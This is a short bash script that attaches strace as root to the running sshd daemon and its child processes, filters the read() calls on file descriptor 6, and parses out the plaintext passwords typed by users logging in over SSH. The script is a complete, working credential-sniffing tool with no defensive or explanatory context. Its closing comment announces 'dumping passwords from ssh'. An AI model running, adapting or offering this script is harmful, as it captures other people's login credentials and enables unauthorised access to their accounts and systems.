#!/bin/bash


get_ssh_pid() {
# return the PID of the parent ssh process
	ps aux|
	grep "sshd -D"|
	grep -v grep|
	awk {'print $2'}
}


extract_passwords() {
# attach strace to the parent ssh process, it will follow children
# parse for read() type 6 output
# push stderr into stdout
# line buffer grep for patterns matching ssh password reads
# parse extraneous debug output away

	strace -e trace=read -e read=6 -f -p $ssh_pid 2>&1 >/dev/null|
	grep --line-buffered "read(6,"|
	grep --line-buffered '\\f\\0\\0\\0'|
	sed 's/\\f\\0\\0\\0//g'|
	awk {'print $4'}|
	sed 's/..$//g'|
	sed 's/^...//g'|
	sed 's/^0//g'
}


check_root() {
# check if user running this is root 
# if not give instructions and exit
	if ((${EUID:-0} || "$(id -u)")); then
		echo "This script must be run as root: sudo $0" 
		exit 1
	fi
}


# strace must be run as root as ssh is also
check_root

# set pid global
ssh_pid=$(get_ssh_pid)

# slow startup explanation
echo "FYI... 4096 bytes of data must be collected before any output can be displayed"

# start reading memory and dumping passwords from ssh!
extract_passwords
